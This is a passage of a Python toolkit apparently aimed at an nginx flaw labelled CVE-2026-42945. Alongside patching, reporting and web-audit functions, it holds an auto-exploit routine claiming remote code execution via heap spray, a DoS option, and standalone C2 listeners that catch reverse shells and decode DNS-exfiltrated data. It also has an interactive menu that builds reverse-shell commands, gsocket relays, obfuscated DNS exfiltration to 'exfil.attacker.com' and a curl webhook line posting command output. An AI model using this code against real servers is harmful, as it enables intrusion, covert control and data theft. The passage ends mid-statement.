        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
        "pin": "apt-mark hold nginx",
    },
    "debian": {
        "upgrade": "apt-get update -qq && apt-get install -y --only-upgrade nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
    "centos": {
        "upgrade": "yum update -y nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
    "rhel": {
        "upgrade": "dnf update -y nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
    "almalinux": {
        "upgrade": "dnf update -y nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
}


def patch_server(host: str, port: int, user: str, password: str | None = None,
                 key_path: str | None = None, dry_run: bool = False,
                 target_version: str = "1.30.1") -> dict:
    """SSH remote patching (gagaltotal style). Uses system ssh binary."""
    if not password and not key_path:
        return {"error": "no auth method (provide password or key_path)"}
    result = {"host": host, "status": "pending", "steps": []}

    def add_step(name: str, status: str, detail: str = ""):
        result["steps"].append({"step": name, "status": status, "detail": detail})

    def run(cmd: str, t: int = 30) -> tuple[str, str, int]:
        return _ssh_run(host, user, cmd,
                        key_path=key_path, password=password, port=port, timeout=t)

    # Test connectivity
    _, err, rc = run("echo ok", t=15)
    if rc != 0:
        add_step("connect", "err", err.strip() or f"ssh exit {rc}")
        result["status"] = "failed"
        return result
    add_step("connect", "ok", f"SSH to {host}:{port} as {user}")

    # Detect OS
    out, _, _ = run("cat /etc/os-release 2>/dev/null | head -3")
    os_out = out.lower()
    distro = None
    for d in PATCH_COMMANDS:
        if d in os_out:
            distro = d
            break
    if not distro:
        out2, _, _ = run("cat /etc/redhat-release 2>/dev/null")
        rh = out2.lower()
        if "centos" in rh:    distro = "centos"
        elif "alma" in rh:    distro = "almalinux"
        elif "red hat" in rh: distro = "rhel"
    if not distro:
        distro = "ubuntu"
    add_step("detect_os", "ok", distro)

    # Current version
    out, _, _ = run("nginx -v 2>&1; echo '---'; /usr/sbin/nginx -v 2>&1")
    add_step("current_version", "ok", out[:100])

    if dry_run:
        add_step("dry_run", "ok", "dry-run mode, no changes made")
        result["status"] = "dry-run"
        return result

    cmds = PATCH_COMMANDS.get(distro, PATCH_COMMANDS["ubuntu"])

    if "backup" in cmds:
        out, _, _ = run(cmds["backup"])
        add_step("backup", "ok", out[:100])

    if "upgrade" in cmds:
        add_step("upgrade", "running", f"target: {target_version}")
        out, err, _ = run(cmds["upgrade"], t=180)
        add_step("upgrade", "ok" if "error" not in err.lower() else "warn",
                 (out + err)[:200])

    if target_version:
        out, _, _ = run(f"nginx -v 2>&1 | grep {target_version}")
        verified = bool(out.strip())
        add_step("verify", "ok" if verified else "warn",
                 f"nginx -v: {target_version} {'found' if verified else 'not found'}")

    if "reload" in cmds:
        out, err, _ = run(cmds["reload"], t=30)
        add_step("reload", "ok", (out or err)[:100])

    result["status"] = "patched"
    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 4: REPORT
# ═══════════════════════════════════════════════════════════════════════

def generate_html_scan_report(results: list[dict], out_path: str):
    """Generate HTML report from scan results (gagaltotal/MateusVerass style)."""
    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    safe_count = sum(1 for r in results if r.get("vulnerable") == False)
    total = len(results)

    rows = ""
    for r in results:
        cls = "vuln" if r.get("vulnerable") else ("safe" if r.get("vulnerable") == False else "unknown")
        ver = r.get("nginx_version") or r.get("server") or "unknown"
        os_info = r.get("os", "N/A")
        rows += f"<tr class='{cls}'><td>{r['host']}</td><td>{ver}</td><td>{os_info}</td><td>{cls}</td></tr>"

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><title>NGINX Rift — Scan Report</title>
<style>
body {{ font-family: -apple-system, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 2rem; }}
h1 {{ color: #58a6ff; }}
table {{ border-collapse: collapse; width: 100%; }}
th {{ background: #161b22; color: #58a6ff; padding: .5rem; text-align: left; border-bottom: 2px solid #30363d; }}
td {{ padding: .5rem; border-bottom: 1px solid #21262d; }}
tr.vuln td {{ border-left: 3px solid #f85149; }}
tr.safe td {{ border-left: 3px solid #3fb950; }}
.summary {{ display: flex; gap: 1rem; margin: 1rem 0; }}
.card {{ padding: 1rem; border-radius: 6px; background: #161b22; flex: 1; }}
.card h3 {{ margin: 0 0 .3rem 0; }}
.num {{ font-size: 2rem; font-weight: 700; }}
.green {{ color: #3fb950; }}
.red {{ color: #f85149; }}
</style></head><body>
<h1>NGINX Rift — Scan Report</h1>
<div class="summary">
  <div class="card"><h3>Total</h3><div class="num">{total}</div></div>
  <div class="card"><h3>Vulnerable</h3><div class="num red">{vuln_count}</div></div>
  <div class="card"><h3>Safe</h3><div class="num green">{safe_count}</div></div>
</div>
<table><thead><tr><th>Host</th><th>Version</th><th>OS</th><th>Status</th></tr></thead>
<tbody>{rows}</tbody></table>
</body></html>"""

    Path(out_path).write_text(html)
    log(f"Report saved: {out_path}", "ok")


def generate_json_report(data: dict, out_path: str):
    Path(out_path).write_text(json.dumps(data, indent=2, default=str))
    log(f"JSON saved: {out_path}", "ok")


def print_scan_results(results: list[dict]):
    rows = []
    for r in results:
        vuln = r.get("vulnerable")
        v_str = f"{_RED}YES{_RST}" if vuln else (f"{_GRN}NO{_RST}" if vuln is False else "?")
        rows.append([r.get("host", "?"), r.get("nginx_version", "?"), v_str])
    _print_table(["Host", "Version", "Vulnerable"], rows, title="Scan Results")


# ═══════════════════════════════════════════════════════════════════════
# MODULE 5: WEB AUDIT (MateusVerass style)
# ═══════════════════════════════════════════════════════════════════════

def audit_headers(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    result = {}
    try:
        sock = socket.create_connection((host, port), timeout=5)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(8192)
            raw = data.decode("latin-1", errors="replace")
            for hdr, desc in SECURITY_HEADERS:
                m = re.search(rf'^{hdr}:\s*(.+)$', raw, re.I | re.M)
                result[hdr] = {"present": bool(m), "value": m.group(1).strip() if m else None,
                               "description": desc}
    except OSError as e:
        return {"error": str(e)}
    return result


def path_discovery(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    found = []
    for path in INTERESTING_PATHS:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                s.sendall(f"GET {path} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                data = s.recv(256)
                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                found.append({"path": path, "status": status})
        except OSError:
            pass
    return {"paths_found": found}


def tls_audit(host: str, port: int, vhost: str = None) -> dict:
    """Check TLS versions (1.0-1.3)."""
    result = {}
    import ssl
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    server_name = vhost or host

    versions = []
    for name, attr in [("TLSv1.0", "TLSv1"), ("TLSv1.1", "TLSv1_1"), 
                       ("TLSv1.2", "TLSv1_2"), ("TLSv1.3", "TLSv1_3")]:
        v = getattr(ssl.TLSVersion, attr, None)
        if v is not None:
            versions.append((name, v))

    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        for ver_name, ver_const in versions:
            try:
                ctx.minimum_version = ver_const
                ctx.maximum_version = ver_const
                with socket.create_connection((host, port), timeout=3) as s:
                    with ctx.wrap_socket(s, server_hostname=server_name):
                        result[ver_name] = True
            except Exception:
                result[ver_name] = False
    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 6: AUTOMATION
# ═══════════════════════════════════════════════════════════════════════

def auto_scan(subnet: str, port: int, user: str = "root",
              password: str | None = None, key_path: str | None = None,
              output: str | None = None) -> list[dict]:
    log(f"Auto-scan: {subnet} port {port}", "info")
    live_hosts = scan_subnet(subnet, port)
    results = []
    for h in live_hosts:
        svc = detect_service(h, port, vhost=h)
        if svc.get("alive"):
            if (password or key_path):
                ssh = scan_ssh(h, port=22, user=user, password=password, key_path=key_path)
                svc.update(ssh)
            results.append(svc)

    if output:
        if output.endswith(".json"):
            generate_json_report({"scan_results": results}, output)
        elif output.endswith(".html"):
            generate_html_scan_report(results, output)

    print_scan_results(results)
    return results


def auto_patch(subnet: str, port: int, user: str = "root",
               password: str | None = None, key_path: str | None = None,
               dry_run: bool = False) -> list[dict]:
    log(f"Auto-patch: {subnet}", "info")
    live = scan_subnet(subnet, port)
    results = []
    for h in live:
        r = patch_server(h, port, user, password, key_path, dry_run)
        results.append(r)
        log(f"{h}: {r['status']}", "ok" if r['status'] == 'patched' else "err")
    return results


def auto_exploit(host: str, port: int, cmd: str, heap_base: int = 0,
                 libc_base: int = 0, system_off: int = DEFAULT_SYSTEM_OFFSET,
                 offsets: list[int] | None = None, vhost: str = "l", use_ssl: bool = False) -> ExploitResult:
    hb = heap_base or DEFAULT_HEAP_BASE
    lb = libc_base or DEFAULT_LIBC_BASE
    off = offsets or DEFAULT_HEAP_OFFSETS
    log(f"Auto-exploit: {host}:{port} vhost={vhost} ssl={use_ssl} cmd='{cmd}'", "info")
    result = mode_exploit(host, port, cmd, hb, lb, system_off, off, 10, vhost=vhost, use_ssl=use_ssl)
    if result.success:
        log(f"RCE confirmed! system('{cmd}') executed", "ok")
    else:
        log(f"Exploit failed: {result.error or 'no crash detected'}", "err")
    return result


# ═══════════════════════════════════════════════════════════════════════
# LISTENER-ONLY MODE (Standalone C2 Callback Capture)
# ═══════════════════════════════════════════════════════════════════════

def mode_listen_only(listen_type: str = "tcp", listen_ip: str = "0.0.0.0",
                     listen_port: int = 0, timeout: int = 0,
                     output_file: str | None = None, verbose: bool = False) -> dict:
    """
    Standalone listener mode: capture incoming C2 callbacks from already-exploited targets.
    
    Args:
        listen_type: "tcp", "http", "dns", "icmp", "ws", or "all"
        listen_ip: IP to bind to (default 0.0.0.0)
        listen_port: Port to listen on (0 = auto-select by type)
        timeout: Listener timeout in seconds (0 = infinite)
        output_file: Optional file to save captured output
        verbose: Show raw packet data
        
    Returns:
        dict with captured_count, packets, errors
    """
    result = {
        "listen_type": listen_type,
        "listen_ip": listen_ip,
        "listen_port": listen_port,
        "timeout": timeout,
        "captured_count": 0,
        "packets": [],
        "errors": [],
        "start_time": datetime.now().isoformat(),
    }
    
    # Default ports by listener type
    default_ports = {
        "tcp": 4444,
        "http": 8888,
        "dns": 53,
        "icmp": 0,  # ICMP doesn't use ports
        "ws": 9999,
    }
    
    # Determine which listeners to start
    if listen_type == "all":
        listeners_to_start = ["tcp", "http", "dns", "ws"]
    else:
        listeners_to_start = [listen_type]
    
    # Start listeners in threads
    listener_threads = []
    listener_states = {}
    
    for ltype in listeners_to_start:
        port = listen_port if listen_port else default_ports.get(ltype, 0)
        if port == 0 and ltype != "icmp":
            port = default_ports.get(ltype, 8888)
        
        state = {
            "type": ltype,
            "port": port,
            "packets": [],
            "running": True,
            "lock": threading.Lock(),
        }
        listener_states[ltype] = state
        
        if ltype == "tcp":
            t = threading.Thread(
                target=_listen_tcp,
                args=(listen_ip, port, state, timeout, verbose),
                daemon=True,
                name=f"listener-tcp-{port}",
            )
        elif ltype == "http":
            t = threading.Thread(
                target=_listen_http,
                args=(listen_ip, port, state, timeout, verbose),
                daemon=True,
                name=f"listener-http-{port}",
            )
        elif ltype == "dns":
            t = threading.Thread(
                target=_listen_dns,
                args=(listen_ip, port, state, timeout, verbose),
                daemon=True,
                name=f"listener-dns-{port}",
            )
        elif ltype == "ws":
            t = threading.Thread(
                target=_listen_websocket,
                args=(listen_ip, port, state, timeout, verbose),
                daemon=True,
                name=f"listener-ws-{port}",
            )
        else:
            continue
        
        listener_threads.append(t)
        t.start()
        log(f"Started {ltype.upper()} listener on {listen_ip}:{port}", "ok")
    
    # Wait for listeners
    try:
        if timeout > 0:
            end_time = time.time() + timeout
            while time.time() < end_time and listener_threads:
                for t in list(listener_threads):
                    if not t.is_alive():
                        listener_threads.remove(t)
                time.sleep(0.5)
        else:
            # Infinite listen mode
            print(f"\n{_GRN}Listening for callbacks... (Press Ctrl+C to stop){_RST}\n")
            while listener_threads:
                for t in list(listener_threads):
                    if not t.is_alive():
                        listener_threads.remove(t)
                time.sleep(0.5)
    except KeyboardInterrupt:
        log("Listener interrupted by user", "warn")
    
    # Collect results from all listeners
    for ltype, state in listener_states.items():
        state["running"] = False
        result["packets"].extend(state["packets"])
        result["captured_count"] += len(state["packets"])
    
    result["end_time"] = datetime.now().isoformat()
    
    # Save to file if requested
    if output_file and result["packets"]:
        try:
            with open(output_file, "w") as f:
                for pkt in result["packets"]:
                    f.write(f"[{pkt['timestamp']}] {pkt['type'].upper()} from {pkt['source']}\n")
                    if pkt.get("decoded"):
                        f.write(f"  Decoded: {pkt['decoded']}\n")
                    if pkt.get("raw"):
                        f.write(f"  Raw: {pkt['raw'][:200]}\n")
                    f.write("\n")
            log(f"Captured packets saved to {output_file}", "ok")
        except Exception as e:
            log(f"Failed to save output: {e}", "err")
            result["errors"].append(str(e))
    
    return result


def _listen_tcp(bind_ip: str, bind_port: int, state: dict, timeout: int, verbose: bool):
    """TCP reverse shell listener - captures incoming shell connections."""
    try:
        kill_port(bind_port)
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((bind_ip, bind_port))
        srv.listen(5)
        srv.settimeout(1)
        
        start_time = time.time()
        while state["running"]:
            try:
                conn, addr = srv.accept()
                timestamp = datetime.now().isoformat()
                source = f"{addr[0]}:{addr[1]}"
                
                # Receive data
                data = b""
                conn.settimeout(5)
                try:
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if len(data) > 65536:  # Limit
                            break
                except socket.timeout:
                    pass
                
                decoded = data.decode("utf-8", errors="replace")
                
                pkt = {
                    "timestamp": timestamp,
                    "type": "tcp",
                    "source": source,
                    "raw": decoded[:500],
                    "decoded": decoded,
                    "size": len(data),
                }
                
                with state["lock"]:
                    state["packets"].append(pkt)
                
                print(f"{_GRN}[TCP]{_RST} {timestamp[:19]} ← {source} ({len(data)} bytes)")
                if verbose or decoded:
                    for line in decoded.strip().split("\n")[:10]:
                        print(f"      {line}")
                
                conn.close()
            except socket.timeout:
                if timeout > 0 and (time.time() - start_time) > timeout:
                    break
            except Exception as e:
                if state["running"]:
                    log(f"TCP listener error: {e}", "warn")
    except Exception as e:
        log(f"TCP listener failed: {e}", "err")
    finally:
        try:
            srv.close()
        except:
            pass


def _listen_http(bind_ip: str, bind_port: int, state: dict, timeout: int, verbose: bool):
    """HTTP callback listener - captures POST requests with command output."""
    try:
        kill_port(bind_port)
        
        class HTTPCaptureHandler(BaseHTTPRequestHandler):
            def do_POST(self):
                timestamp = datetime.now().isoformat()
                source = f"{self.client_address[0]}:{self.client_address[1]}"
                
                content_len = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_len) if content_len else b""
                decoded = body.decode("utf-8", errors="replace")
                
                pkt = {
                    "timestamp": timestamp,
                    "type": "http",
                    "source": source,
                    "method": "POST",
                    "path": self.path,
                    "raw": decoded[:500],
                    "decoded": decoded,
                    "size": len(body),
                    "headers": dict(self.headers),
                }
                
                with state["lock"]:
                    state["packets"].append(pkt)
                
                print(f"{_BLU}[HTTP]{_RST} {timestamp[:19]} ← {source} POST {self.path} ({len(body)} bytes)")
                if verbose or decoded:
                    for line in decoded.strip().split("\n")[:10]:
                        print(f"       {line}")
                
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            
            def do_GET(self):
                timestamp = datetime.now().isoformat()
                source = f"{self.client_address[0]}:{self.client_address[1]}"
                
                pkt = {
                    "timestamp": timestamp,
                    "type": "http",
                    "source": source,
                    "method": "GET",
                    "path": self.path,
                    "raw": self.path,
                    "decoded": self.path,
                    "size": 0,
                }
                
                with state["lock"]:
                    state["packets"].append(pkt)
                
                print(f"{_BLU}[HTTP]{_RST} {timestamp[:19]} ← {source} GET {self.path}")
                
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, *args):
                pass
        
        srv = HTTPServer((bind_ip, bind_port), HTTPCaptureHandler)
        srv.timeout = 1
        
        start_time = time.time()
        while state["running"]:
            srv.handle_request()
            if timeout > 0 and (time.time() - start_time) > timeout:
                break
        
        srv.server_close()
    except Exception as e:
        log(f"HTTP listener failed: {e}", "err")


def _listen_dns(bind_ip: str, bind_port: int, state: dict, timeout: int, verbose: bool):
    """DNS exfiltration listener - captures DNS queries with base64-encoded subdomains."""
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((bind_ip, bind_port))
        srv.settimeout(1)
        
        start_time = time.time()
        while state["running"]:
            try:
                data, addr = srv.recvfrom(512)
                timestamp = datetime.now().isoformat()
                source = f"{addr[0]}:{addr[1]}"
                
                # Parse DNS query
                try:
                    if len(data) > 12:
                        # Extract domain name from query
                        domain_part = data[12:]
                        labels = []
                        pos = 0
                        while pos < len(domain_part):
                            length = domain_part[pos]
                            if length == 0:
                                break
                            pos += 1
                            label = domain_part[pos:pos+length].decode("utf-8", errors="replace")
                            labels.append(label)
                            pos += length
                        
                        domain = ".".join(labels)
                        
                        # Try to decode base64 from subdomain
                        decoded_data = ""
                        for label in labels[:-2]:  # Skip TLD and domain
                            try:
                                # Handle URL-safe base64 + padding
                                padded = label + "=" * (4 - len(label) % 4)
                                decoded_data += base64.b64decode(padded, altchars=b"-_").decode("utf-8", errors="replace")
                            except:
                                decoded_data += label + "."
                        
                        pkt = {
                            "timestamp": timestamp,
                            "type": "dns",
                            "source": source,
                            "domain": domain,
                            "raw": domain,
                            "decoded": decoded_data.strip(".") or domain,
                            "size": len(data),
                        }
                        
                        with state["lock"]:
                            state["packets"].append(pkt)
                        
                        print(f"{_YLW}[DNS]{_RST} {timestamp[:19]} ← {source} → {domain}")
                        if verbose and decoded_data:
                            print(f"      Decoded: {decoded_data[:200]}")
                except Exception as e:
                    log(f"DNS parse error: {e}", "warn")
                
                # Send minimal DNS response (NXDOMAIN)
                try:
                    response = data[:2] + b"\x84\x03" + data[4:6] + b"\x00\x00\x00\x00\x00\x00"
                    srv.sendto(response, addr)
                except:
                    pass
            
            except socket.timeout:
                if timeout > 0 and (time.time() - start_time) > timeout:
                    break
            except Exception as e:
                if state["running"]:
                    log(f"DNS listener error: {e}", "warn")
        
        srv.close()
    except Exception as e:
        log(f"DNS listener failed: {e}", "err")


def _listen_websocket(bind_ip: str, bind_port: int, state: dict, timeout: int, verbose: bool):
    """WebSocket callback listener - captures WebSocket connections."""
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((bind_ip, bind_port))
        srv.listen(5)
        srv.settimeout(1)
        
        start_time = time.time()
        while state["running"]:
            try:
                conn, addr = srv.accept()
                timestamp = datetime.now().isoformat()
                source = f"{addr[0]}:{addr[1]}"
                
                # Receive WebSocket handshake
                handshake = conn.recv(1024).decode("utf-8", errors="replace")
                
                # Extract Sec-WebSocket-Key
                key = None
                for line in handshake.split("\r\n"):
                    if line.startswith("Sec-WebSocket-Key:"):
                        key = line.split(":", 1)[1].strip()
                        break
                
                if key:
                    # Compute accept key
                    magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
                    accept_key = base64.b64encode(
                        hashlib.sha1((key + magic).encode()).digest()
                    ).decode()
                    
                    # Send handshake response
                    response = (
                        "HTTP/1.1 101 Switching Protocols\r\n"
                        "Upgrade: websocket\r\n"
                        "Connection: Upgrade\r\n"
                        f"Sec-WebSocket-Accept: {accept_key}\r\n"
                        "\r\n"
                    )
                    conn.sendall(response.encode())
                    
                    print(f"{_MAG}[WS]{_RST} {timestamp[:19]} ← {source} connected")
                    
                    # Receive WebSocket frames
                    conn.settimeout(5)
                    try:
                        while True:
                            frame = conn.recv(4096)
                            if not frame:
                                break
                            
                            # WebSocket frame parsing
                            if len(frame) >= 2:
                                opcode = frame[0] & 0x0F
                                masked = (frame[1] & 0x80) != 0
                                payload_len = frame[1] & 0x7F
                                
                                if opcode == 1:  # Text frame
                                    payload_start = 2
                                    if payload_len == 126:
                                        payload_start = 4
                                    elif payload_len == 127:
                                        payload_start = 10
                                    
                                    if masked and payload_start + 4 <= len(frame):
                                        mask = frame[payload_start:payload_start+4]
                                        payload = frame[payload_start+4:]
                                        decoded_payload = bytes(
                                            p ^ mask[i % 4] for i, p in enumerate(payload)
                                        ).decode("utf-8", errors="replace")
                                    else:
                                        decoded_payload = frame[payload_start:].decode("utf-8", errors="replace")
                                    
                                    pkt = {
                                        "timestamp": datetime.now().isoformat(),
                                        "type": "ws",
                                        "source": source,
                                        "raw": decoded_payload[:500],
                                        "decoded": decoded_payload,
                                        "size": len(decoded_payload),
                                    }
                                    
                                    with state["lock"]:
                                        state["packets"].append(pkt)
                                    
                                    print(f"{_MAG}[WS]{_RST} {timestamp[:19]} ← {source} ({len(decoded_payload)} bytes)")
                                    if verbose or decoded_payload:
                                        for line in decoded_payload.strip().split("\n")[:10]:
                                            print(f"     {line}")
                    except socket.timeout:
                        pass
                
                conn.close()
            except socket.timeout:
                if timeout > 0 and (time.time() - start_time) > timeout:
                    break
            except Exception as e:
                if state["running"]:
                    log(f"WebSocket listener error: {e}", "warn")
        
        srv.close()
    except Exception as e:
        log(f"WebSocket listener failed: {e}", "err")


# ═══════════════════════════════════════════════════════════════════════
# INTERACTIVE TUI
# ═══════════════════════════════════════════════════════════════════════

def run_interactive():
    """Zero-dependency interactive menu."""
    def _clr():
        os.system("clear 2>/dev/null || cls 2>/dev/null")

    _clr()
    print(_CYAN + _BOLD + BANNER + _RST)
    print(f"{_DIM}Interactive Super Toolkit — CVE-2026-42945{_RST}\n")

    while True:
        _print_panel(
            f"{_GRN}[1]{_RST}  Scan Network (subnet discovery)\n"
            f"{_GRN}[2]{_RST}  Check Target (fingerprint + vuln check)\n"
            f"{_GRN}[3]{_RST}  Exploit Target (RCE via heap spray)\n"
            f"{_YLW}[4]{_RST}  32-bit Brute Force (callback RCE)\n"
            f"{_YLW}[5]{_RST}  Patch Target (SSH remote patch)\n"
            f"{_CYAN}[6]{_RST}  Web Audit (headers, paths, TLS)\n"
            f"{_CYAN}[7]{_RST}  CIDR Auto-Scan → Report\n"
            f"{_RED}[8]{_RST}  DoS Test (crash verification)\n"
            f"{_BLU}[9]{_RST}  Generate Report (HTML/JSON)\n"
            f"{_BLU}[10]{_RST} Bulk Fingerprint + Vuln Check (target list)\n"
            f"{_MAG}[11]{_RST} Listener Only (capture incoming C2 callbacks)\n"
            f"{_DIM}[0]{_RST}  Exit",
            title="Menu",
        )

        choice = _ask("Select", choices=["0","1","2","3","4","5","6","7","8","9","10","11"])

        if choice == "0":
            print(f"{_YLW}Goodbye!{_RST}")
            break

        elif choice == "1":
            subnet = _ask("CIDR subnet", default="192.168.1.0/24")
            port = int(_ask("Port", default=str(DEFAULT_PORT)))
            with _Spinner("Scanning..."):
                hosts = scan_subnet(subnet, port)
            if hosts:
                _print_table(["#", "Host"],
                             [[str(i), h] for i, h in enumerate(hosts, 1)],
                             title=f"Live hosts on port {port}")
            else:
                print(f"{_YLW}No live hosts found.{_RST}")

        elif choice == "2":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                continue
            host, port, vhost, use_ssl = parsed
            with _Spinner("Checking..."):
                check = mode_check(host, port, vhost=vhost, use_ssl=use_ssl)
                svc = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)
                waf = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
            _print_panel(json.dumps(check, indent=2)[:1000], title="Check Result")
            print(f"{_GRN}Server:{_RST} {svc.get('server', '?')}")
            if svc.get("redirect"):
                print(f"{_YLW}Redirect detected:{_RST} {svc['redirect']}")
            if waf:
                print(f"{_RED}WAF detected: {', '.join(waf)}{_RST}")

        elif choice == "3":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                continue
            host, port, vhost, use_ssl = parsed
            
            # ─── C2 Method Selection (if available) ────
            c2_method_name = None
            c2_payload_processor = None
            if _C2_AVAILABLE:
                c2_choice = _ask(
                    "Output capture method",
                    choices=["direct", "dns", "http", "gsocket", "l2relay", "slack", "discord", "webhook"],
                    default="direct",
                )
                if c2_choice == "dns":
                    from c2_methods import DNSExfiltration
                    dns_server = _ask("DNS server IP", default="8.8.8.8")
                    domain = _ask("Domain for exfiltration", default="exfil.attacker.com")
                    from c2_obfuscator import ObfuscationProfile
                    obf_level = _ask("Obfuscation", choices=["none", "light", "medium", "heavy"], default="light")
                    def c2_processor(cmd):
                        method = DNSExfiltration(dns_server=dns_server, domain=domain)
                        payload = method.generate_payload(cmd, dns_server=dns_server, domain=domain)
                        if obf_level != "none":
                            if obf_level == "light":
                                payload = ObfuscationProfile.light_obfuscation(payload)
                            elif obf_level == "medium":
                                payload = ObfuscationProfile.medium_obfuscation(payload)
                            elif obf_level == "heavy":
                                payload = ObfuscationProfile.heavy_obfuscation(payload)
                        return payload
                    c2_payload_processor = c2_processor
                    c2_method_name = "dns"
                elif c2_choice == "slack":
                    webhook_url = _ask("Slack webhook URL")
                    from c2_methods import SlackWebhook
                    from c2_obfuscator import ObfuscationProfile
                    def c2_processor(cmd):
                        method = SlackWebhook(webhook_url=webhook_url)
                        payload = method.generate_payload(cmd, webhook_url=webhook_url)
                        return payload
                    c2_payload_processor = c2_processor
                    c2_method_name = "slack"
                elif c2_choice == "webhook":
                    webhook_url = _ask("Webhook URL (Slack/Discord/Telegram)")
                    from c2_obfuscator import ObfuscationProfile
                    def c2_processor(cmd):
                        return f"curl -X POST '{webhook_url}' -d '{{\"text\":\"$({cmd})\"}}'"
                    c2_payload_processor = c2_processor
            
            use_shell = _confirm("Use reverse shell?", default=False)

            cb_method:    str = "none"
            cb_state:     CallbackState | None = None
            gs_receiver:  GSocketCallbackReceiver | None = None
            l2_mode:      bool = False
            l1_gs_proc                = None
            lport:        int = 1337

            if use_shell:
                shell_mode = _ask(
                    "Shell mode",
                    choices=["direct", "l2relay"],
                    default="direct",
                )
                if shell_mode == "l2relay":
                    l2_mode = True
                    l2_ip   = _ask("L2 Relay IP (Relay IP from gsocket-relay.sh)")
                    l2_port = int(_ask("L2 Relay Port", default="12345"))
                    l1_tok  = _ask("L1 GSocket Token (blank = auto-generate)", default="")
                    l2_sec  = _ask("L2 Local Secret  (blank = placeholder)", default="")
                    if not l1_tok:
                        import secrets as _sec
                        l1_tok = _sec.token_hex(16)

                    cmd = build_l2_payload(l2_ip, l2_port)
                    show_l2relay_panel(l2_ip, l2_port, l1_tok, l2_sec, cmd)

                    print(f"{_DIM}Starting L1 GSocket listener...{_RST}")
                    l1_gs_proc = start_gsocket_l1_listener(l1_tok)
                    if l1_gs_proc:
                        print(f"{_GRN}L1 listener started{_RST} PID={l1_gs_proc.pid}  "
                              f"secret={_CYAN}{_BOLD}{l1_tok}{_RST}")
                    else:
                        print(f"{_RED}gs-netcat not found on this machine.{_RST}\n"
                              f"  Start L1 listener manually: "
                              f"{_CYAN}{_BOLD}gs-netcat -l -s \"{l1_tok}\"{_RST}")

                    print(f"\n{_BOLD}{_YLW}Now start L2 bridge on relay machine:{_RST}\n"
                          f"  {_CYAN}{_BOLD}gs-netcat -l -p {l2_port} -s "
                          f"\"{l2_sec or 'L2_SECRET'}\" | gs-netcat -s \"{l1_tok}\"{_RST}\n"
                          f"\n{_DIM}L2's connect side dials L1 via GSocket relay —"
                          f" L1 must be listening first.{_RST}")
                    input(f"{_DIM}Press Enter when L2 bridge is running to fire exploit{_RST} ")
                else:
                    lhost = _ask("Your IP", default="172.17.0.1")
                    lport = int(_ask("Listener port", default="1337"))
                    cmd = build_reverse_shell_cmd(lhost, lport)
            else:
                cmd = _ask("Command", default="id")
                if not c2_payload_processor:  # If C2 not already selected, offer callback
                    cb_method = _ask(
                        "Capture output via",
                        choices=["none", "gsocket", "http"],
                        default="gsocket",
                    )
                if cb_method == "gsocket":
                    gs_secret    = _ask("GSocket secret (blank = auto-generate)", default="")
                    gs_relay_str = _ask("GSRN relay", default=f"{GSRN_HOST}:{GSRN_PORT}")
                    _rh, _, _rp = gs_relay_str.partition(":")
                    gs_receiver = GSocketCallbackReceiver(
                        gs_secret or None, _rh, int(_rp) if _rp else GSRN_PORT
                    )
                    print(f"{_DIM}Connecting to GSRN relay...{_RST}")
                    if gs_receiver.start():
                        print(f"\n{_GRN}GSRN ready!{_RST}  "
                              f"secret={_CYAN}{_BOLD}{gs_receiver.secret}{_RST}\n"
                              f"{_DIM}gs-netcat target cmd:{_RST} "
